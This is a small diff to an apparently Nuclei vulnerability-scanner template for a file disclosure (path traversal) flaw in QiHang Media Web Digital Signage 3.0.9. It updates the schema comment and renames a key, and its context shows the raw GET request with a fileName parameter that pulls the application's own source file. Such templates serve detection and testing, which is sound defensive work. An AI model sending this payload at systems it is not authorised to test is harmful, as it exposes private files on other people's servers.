@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: qihang-media-lfi
 info:
   name: QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure
@@ -11,7 +12,7 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: qihang,lfi,disclosure
-requests:
+http:
   - raw:
       - |
         GET /QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx HTTP/1.1
